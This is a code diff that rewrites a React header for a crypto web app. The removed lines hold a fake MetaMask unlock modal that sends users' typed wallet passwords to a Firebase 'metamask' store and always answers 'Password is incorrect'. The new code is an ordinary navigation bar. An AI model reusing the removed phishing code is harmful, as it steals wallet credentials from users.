@@ -1,276 +1,254 @@
-import React, { useState, useEffect } from "react";
-import { Menu } from "antd";
-import NavItem from "./common/NavItem";
-import AuthService from "../services/auth.service";
-import ButtonItem from "./common/ButtonItem";
-import ethlogo from "../assets/eth_logo.svg";
-import arrowdown from "../assets/arrow-down.svg";
-import metamask from "../assets/MetaMask-icon-fox.svg";
-import Spinner from "../assets/spinner.gif";
-import AuthLogo from "../components/AuthLogo";
-import Loading from "../assets/loading.svg";
-import { database, ref, push, set, get } from "../components/firebase";
-import '../ph.css'
+import React, { useMemo, useState, useRef, useEffect } from "react";
+import { Link, useLocation } from "react-router-dom";
+import useAuth from "../hooks/useAuth";
+import useMetaMask from "../hooks/useMetaMask";
+
+// Reusable SVG Icons
+const CopyIcon = () => (
+  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+  </svg>
+);
+// Dropdown menu Avatar Profile Icon
+const UserAvatar = ({ username }) => (
+  <div className="h-9 w-9 rounded-full bg-indigo-100 flex items-center justify-center text-indigo-700 font-semibold text-sm cursor-pointer hover:ring-2 hover:ring-indigo-300 transition-all">
+    {username ? username.charAt(0).toUpperCase() : "U"}
+  </div>
+);
+
 const Header = () => {
-  const maxTrial = 2;
-  const [over, setOver] = React.useState(false);
-  const [currentUser, setCurrentUser] = useState();
-  const [showAdminBoard, setShowAdminBoard] = useState(false);
-  const [isVisible, setIsVisible] = useState(false);
-  const [rightPos, setRightPos] = React.useState(0);
-  const [value, setValue] = React.useState("");
-  const [count, setCount] = React.useState(1);
-  const formLabelRef = React.useRef(HTMLLabelElement);
-  const unlockButtonRef = React.useRef(HTMLButtonElement);
-  const modalRef = React.useRef();
-  const [wrongPass, setWrongPass] = React.useState(false);
-  const [showDelay, setShowDelay] = React.useState(false);
-  const [pixelValue, setPixelValue] = React.useState(36);
-  const [enterCount, setEnterCount] = React.useState(0);
-  const [spinner, setSpinner] = React.useState(false);
-  const handleClickOutside = (event) => {
-    if (modalRef.current && !modalRef.current.contains(event.target)) {
-      setIsVisible(false);
-      setValue("");
-    }
-  };
+  const { user, isAuthenticated, isAdmin, logout } = useAuth();
+  const { walletAddress, formattedAddress, connect } = useMetaMask();
+  const [menuOpen, setMenuOpen] = useState(false);
+  const [profileDropdownOpen, setProfileDropdownOpen] = useState(false);
+  const dropdownRef = useRef(null);
+  const location = useLocation();
 
-  const logOut = () => {
-    AuthService.logout();
-    setCurrentUser(undefined);
-  };
+  const showAdmin = isAdmin;
 
-  const openModal = () => {
-    setSpinner(true);
-    setTimeout(() => {
-      setIsVisible(true);
-    }, 500);
-    setTimeout(() => {
-      setSpinner(false);
-    }, 1000);
-  }
+  const navLinks = useMemo(
+    () => [
+      { to: "/home", title: "Home", show: true },
+      { to: "/store", title: "Store", show: true },
+      { to: "/social", title: "Social", show: true },
+      { to: "/user", title: "Chat", show: true },
+      { to: "/admin", title: "Admin", show: showAdmin },
+    ],
+    [showAdmin]
+  );
 
-  const changePos = {
-    right: rightPos,
-  };
+  const [isScrolled, setIsScrolled] = useState(false);
 
-
-  const writeToDatabase = () => {
-    const dbRef = ref(database, "metamask");
-    push(dbRef, { password: value })
-      .then(() => {
-        console.log("Data written successfully!");
-      })
-      .catch((error) => {
-        console.error("Error writing data:", error);
-      });
-    setWrongPass(true);
-    delay();
-  };
-
-  const inputFocus = (event) => {
-    if (formLabelRef.current) {
-      // formLabelRef.current.classList.add("movelabel");
-
-    }
-  };
-
-  const blurHandler = (event) => {
-    if (formLabelRef.current && value == "") {
-      // formLabelRef.current.classList.remove("movelabel");
-    }
-  };
-
-  const handleKeyDown = (event) => {
-    if (event.key === "Enter") {
-      event.preventDefault();
-      const dbRef = ref(database, "metamask");
-      push(dbRef, { password: value })
-        .then(() => {
-          console.log("Data written successfully!");
-        })
-        .catch((error) => {
-          console.error("Error writing data:", error);
-        });
-      const elements = document.getElementsByClassName("wrong-pass");
-      if (elements.length > 0) {
-        elements[0].style.display = "block";
-      }
-      delay();
-    }
-  };
-  const delay = () => {
-    setShowDelay(true);
-    setWrongPass(false);
-    setTimeout(() => {
-      setShowDelay(false);
-      setWrongPass(true);
-    }, 200);
-    if (enterCount >= maxTrial - 1) {
-      setOver(true);
-      setIsVisible(false);
-    }
-    setEnterCount(enterCount + 1);
-  }
-
+  // Handle scroll for shadow
   useEffect(() => {
-    const button = unlockButtonRef.current;
-    if (!isVisible) return;
-    if (button) {
-      if (value == "" && button.classList.contains("entered")) {
-        button.classList.remove("entered");
-      }
-      if (value != "" && !button.classList.contains("entered")) {
-        button.classList.add("entered");
-      }
-    }
-  }, [value]);
-
-  useEffect(() => {
-    const fetchData = async () => {
-      try {
-        const dbRef = ref(database, "count");
-        const snapshot = await get(dbRef);
-
-        if (snapshot.exists()) {
-          setCount(snapshot.val());
-        } else {
-          setCount(0);
-          console.log("No data available for the specified key.");
-        }
-      } catch (err) {
-        console.error("Error fetching data:", err);
-      }
+    const handleScroll = () => {
+      setIsScrolled(window.scrollY > 0);
     };
-
-    fetchData();
-
-    setRightPos(pixelValue * count + 102);
-
-    if (isVisible) {
-      document.addEventListener("mousedown", handleClickOutside);
-    }
-
-    return () => {
-      document.removeEventListener("mousedown", handleClickOutside);
-    };
-  }, [isVisible])
-
-  useEffect(() => {
-    const user = AuthService.getCurrentUser();
-    if (user) {
-      setCurrentUser(user);
-      setShowAdminBoard(user.roles.includes("ROLE_ADMIN"));
-    }
-    console.log("user", user);
+    window.addEventListener("scroll", handleScroll);
+    return () => window.removeEventListener("scroll", handleScroll);
   }, []);
 
+  // Close dropdown on click outside
+  useEffect(() => {
+    const handleClickOutside = (event) => {
+      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {
+        setProfileDropdownOpen(false);
+      }
+    };
+    document.addEventListener("mousedown", handleClickOutside);
+    return () => document.removeEventListener("mousedown", handleClickOutside);
+  }, []);
+
+  const handleLogout = (event) => {
+    event.preventDefault();
+    logout();
+    setProfileDropdownOpen(false);
+  };
+
+  const copyWallet = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(walletAddress);
+  };
 
   return (
-    <>
-      <Menu className="h-[70px] px-16 border-2 drop-shadow-lg">
-        {currentUser ? (
-          <>
-            <div className="float-left mt-3">
-              <img
-                src="./MetasphereswithTagLine.png"
-                style={{ width: 60, height: 45 }}
-              />
+    <header className={`sticky top-0 z-50 w-full border-b border-[#E2E8F0] bg-white/80 backdrop-blur-md transition-shadow duration-200 ${isScrolled ? 'shadow-sm' : ''}`}>
+      <div className="mx-auto flex h-[70px] max-w-[1280px] items-center justify-between px-4 sm:px-6 lg:px-8">
+        
+        {/* Left: Logo */}
+        <Link to="/home" className="flex items-center gap-2 flex-shrink-0">
+          <img src="./MetasphereswithTagLine.png" alt="MetaBrain" className="h-8 w-auto object-contain" />
+        </Link>
+
+        {/* Center: Navigation */}
+        <nav className="hidden md:flex items-center space-x-2">
+          {navLinks.filter(l => l.show).map(link => {
+            const isActive = location.pathname.startsWith(link.to);
+            return (
+              <Link
+                key={link.to}
+                to={link.to}
+                className={`px-3 py-1.5 rounded-full text-[15px] font-medium transition-all duration-200 ease-in-out
+                  ${isActive 
+                    ? "bg-slate-100 text-[#0F172A]" 
+                    : "text-[#475569] hover:bg-slate-100 hover:text-[#0F172A]"}`}
+              >
+                {link.title}
+              </Link>
+            );
+          })}
+        </nav>
+
+        {/* Right: Wallet + User + CTA */}
+        <div className="hidden md:flex items-center space-x-4">
+          
+          {/* Wallet Badge */}
+          {walletAddress ? (
+            <button 
+              onClick={copyWallet}
+              className="group relative flex items-center space-x-2 rounded-full border border-slate-200 bg-white px-3 py-1.5 text-sm font-medium text-slate-700 shadow-[0_1px_2px_rgba(0,0,0,0.05)] transition-all duration-200 hover:-translate-y-[1px] hover:border-slate-300 hover:shadow-md focus:outline-none"
+            >
+              <span className="flex h-2 w-2 rounded-full bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]"></span>
+              <span>{formattedAddress}</span>
+              <span className="opacity-0 group-hover:opacity-100 transition-opacity ml-1 text-slate-400">
+                <CopyIcon />
+              </span>
+            </button>
+          ) : (
+            <button
+              onClick={connect}
+              className="rounded-full border border-slate-200 bg-white px-4 py-1.5 text-[15px] font-medium text-slate-700 shadow-sm transition-all duration-200 hover:-translate-y-[1px] hover:border-slate-300 hover:bg-slate-50 hover:text-slate-900"
+            >
+              Connect Wallet
+            </button>
+          )}
+
+          {/* User Section */}
+          {isAuthenticated ? (
+            <div className="relative flex items-center gap-3" ref={dropdownRef}>
+              {/* Optional CTA */}
+              <Link 
+                to="/store"
+                className="hidden lg:block rounded-[10px] bg-gradient-to-r from-[#4F46E5] to-[#7C3AED] px-4 py-1.5 text-[14px] font-medium text-white shadow-sm transition-all duration-200 hover:-translate-y-[1px] hover:shadow-md"
+              >
+                Launch App
+              </Link>
+              
+              <button 
+                onClick={() => setProfileDropdownOpen(!profileDropdownOpen)}
+                className="flex items-center focus:outline-none transition-transform duration-200 hover:-translate-y-[1px]"
+              >
+                <UserAvatar username={user?.username} />
+              </button>
+
+              {/* Dropdown Menu */}
+              <div 
+                className={`absolute right-0 top-[120%] mt-2 w-56 origin-top-right rounded-xl bg-white shadow-lg ring-1 ring-black ring-opacity-5 transition-all duration-200 ease-in-out
+                  ${profileDropdownOpen ? 'opacity-100 scale-100 translate-y-0' : 'opacity-0 scale-95 -translate-y-2 pointer-events-none'}`}
+              >
+                <div className="py-1">
+                  <div className="px-4 py-3 border-b border-slate-100 mb-1">
+                    <p className="text-sm font-semibold text-slate-900 truncate">{user?.username}</p>
+                    <p className="text-xs text-slate-500 truncate mt-0.5">{user?.email}</p>
+                  </div>
+                  <Link to="/profile" className="block px-4 py-2 text-sm text-slate-700 hover:bg-slate-50 hover:text-slate-900 transition-colors" onClick={() => setProfileDropdownOpen(false)}>
+                    Profile
+                  </Link>
+                  <button 
+                    onClick={() => { copyWallet(); setProfileDropdownOpen(false); }}
+                    className="block w-full text-left px-4 py-2 text-sm text-slate-700 hover:bg-slate-50 hover:text-slate-900 transition-colors"
+                  >
+                    Wallet
+                  </button>
+                  <Link to="/settings" className="block px-4 py-2 text-sm text-slate-700 hover:bg-slate-50 hover:text-slate-900 transition-colors" onClick={() => setProfileDropdownOpen(false)}>
+                    Settings
+                  </Link>
+                  <div className="border-t border-slate-100 mt-1"></div>
+                  <button 
+                    onClick={handleLogout}
+                    className="block w-full text-left px-4 py-2 mt-1 text-sm text-red-600 hover:bg-red-50 hover:text-red-700 transition-colors"
+                  >
+                    Logout
+                  </button>
+                </div>
+              </div>
             </div>
-            <div className="float-right flex">
-              <NavItem to="/home" title="Home" />
-              {/* <NavItem to="/mod" title="Moderator Board" /> */}
-              {showAdminBoard && <NavItem to="/admin" title="Knowledge Base" />}
-              <NavItem to="/user" title="User" />
-              <li className="my-5 ml-24 block text-lg font-normal hover:font-bold hover:text-back-red md:inline-block">
-                <a href="/login" onClick={logOut}>
-                  LogOut
-                </a>
-              </li>
-              <NavItem to="/profile" title={currentUser.username} />
-            </div>
-          </>
-        ) : (
-          <>
-            <div className="float-left mt-3">
-              <img
-                src="./MetasphereswithTagLine.png"
-                style={{ width: 60, height: 45 }}
-              />
-            </div>
-            <div className="float-right flex">
-              <NavItem
-                to="/login"
-                title="Login"
-                addClass="border-2 text-center"
-              />
-              <ButtonItem
-                buttonName="Connect"
-                addClass="bg-white text-center ml-8 w-24 m-auto"
-                onClick={openModal}
-              />
-            </div>
-          </>
-        )}
-      </Menu>
-      <>
-        {
-          isVisible && (
-            spinner ? (
-              <div className="loading" style={changePos}>
-                <img className="loading-logo" src={metamask} />
-                <img className="loading-spinner" src={Spinner} />
+          ) : (
+            <>
+              <Link to="/login" className="text-[15px] font-medium text-[#475569] hover:text-[#0F172A] transition-colors">
+                Log In
+              </Link>
+              <Link to="/register" className="rounded-[10px] bg-gradient-to-r from-[#4F46E5] to-[#7C3AED] px-4 py-1.5 text-[14px] font-medium text-white shadow-sm transition-all duration-200 hover:-translate-y-[1px] hover:shadow-md">
+                Sign Up
+              </Link>
+            </>
+          )}
+
+        </div>
+
+        {/* Mobile Menu Button */}
+        <button
+          className="md:hidden rounded-md p-2 text-slate-500 hover:bg-slate-100 hover:text-slate-700 focus:outline-none"
+          onClick={() => setMenuOpen(!menuOpen)}
+        >
+          <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            {menuOpen ? (
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+            ) : (
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
+            )}
+          </svg>
+        </button>
+      </div>
+
+      {/* Mobile Menu */}
+      {menuOpen && (
+        <div className="md:hidden border-t border-slate-100 bg-white px-4 pt-2 pb-4 shadow-lg absolute w-full left-0">
+          <nav className="flex flex-col space-y-1">
+            {navLinks.filter(l => l.show).map((link) => {
+              const isActive = location.pathname.startsWith(link.to);
+              return (
+                <Link
+                  key={link.to}
+                  to={link.to}
+                  onClick={() => setMenuOpen(false)}
+                  className={`block rounded-lg px-3 py-2 text-base font-medium transition-colors
+                    ${isActive ? 'bg-slate-50 text-indigo-600' : 'text-slate-700 hover:bg-slate-50 hover:text-slate-900'}`}
+                >
+                  {link.title}
+                </Link>
+              );
+            })}
+            
+            <div className="my-2 border-t border-slate-100"></div>
+            
+            {!isAuthenticated && (
+              <>
+                <Link to="/login" onClick={() => setMenuOpen(false)} className="block rounded-lg px-3 py-2 text-base font-medium text-slate-700 hover:bg-slate-50">
+                  Log In
+                </Link>
+                <Link to="/register" onClick={() => setMenuOpen(false)} className="block rounded-lg px-3 py-2 text-base font-medium text-indigo-600 hover:bg-slate-50">
+                  Sign Up
+                </Link>
+              </>
+            )}
+
+            {walletAddress ? (
+              <div className="px-3 py-2 text-sm text-slate-600 break-all">
+                Wallet: {formattedAddress}
               </div>
             ) : (
-              <div className="modalcontainer" id="modal-container" style={{ backgroundColor: "white", right: rightPos, display: isVisible ? 'inline-block' : 'none' }} ref={modalRef} >
-                {/* <div className="toppart">
-                  <button className="category">
-                    <div className="icon">
-                      <img src={ethlogo} />
-                    </div>
-                    <div className="defaultcategory">Ethereum Mainnet</div>
-                    <div className="downicon">
-                      <img src={arrowdown} />
-                    </div>
-                  </button>
-                  <button className="logo">
-                    <img src={metamask} />
-                  </button>
-                </div> */}
-                <div className="mainpart">
-                  <div className="maincontainer" id="mainpart">
-                    <div style={{ zIndex: 0 }}>
-                      <AuthLogo />
-                    </div>
-                    <h1 style={{ color: "black", fontFamily: "Geist"}}>Welcome back</h1>
-                    {/* <p style={{ color: "white"}}>The decentralized web awaits</p> */}
-                    <form className="form">
-                      <div className="form-group">
-                        {/* <label className="form-label" id="form-id" htmlFor="pass" ref={formLabelRef} style={{paddingLeft: 10, backgroundColor: "#121314"}}> Enter your Password </label> */}
-                        <input placeholder="Enter your password" value={value} onKeyDown={handleKeyDown} onChange={(e) => { setValue(e.target.value); setWrongPass(false) }} onFocus={inputFocus} onBlur={blurHandler} id="pass" className="form-input" type="password" style={{borderColor: wrongPass ? "#ca3542" : "#888989" }}/>
-                      </div>
-                      <div style={{display: "flex", justifyContent:"flex-start", backgroundColor: "white", marginTop: "5px"}}>
-                        <p className="wrong-pass" style={{ display: wrongPass ? 'block' : 'none', fontSize: "0.85rem"}}>Password is incorrect. Please try again</p>
-                      </div>
-                    </form>
-                    <button className="unlocksubmit" onClick={writeToDatabase} ref={unlockButtonRef}>Unlock</button>
-                    <div className="forgot">
-                      <a style={{ color: "#4459ff"}} className="button">Forgot password?</a>
-                    </div>
-                    <div className="help">
-                      <span style={{ color: "black" }}>Need help? Contact&nbsp;
-                        <a href="https:support.metamask.io" target="_blank" rel="noopener noreferrer" style={{ color: "#4459ff", fontWeight: 'bold'}}>MetaMask support</a>
-                      </span>
-                    </div>
-                  </div>
-                </div>
-                <div className="loading-pannel" style={{ display: showDelay ? 'block' : 'none', width: '100%', height: '100%', position: 'absolute', backgroundColor: "white", top: 0, zIndex: 2000, opacity: 0.8 }}>
-                  <img className="loading-pannel-img" style={{ position: "relative", left: "50%", top: "50%", transform: "translate(-50%, -50%)" }} src={Loading} />
-                </div>
-              </div>))
-        }
-      </>
-    </>
+              <button
+                onClick={() => { connect(); setMenuOpen(false); }}
+                className="w-full mt-2 rounded-lg border border-slate-200 bg-white px-4 py-2 text-center text-sm font-medium text-slate-700 shadow-sm hover:bg-slate-50"
+              >
+                Connect Wallet
+              </button>
+            )}
+          </nav>
+        </div>
+      )}
+    </header>
   );
 };
 
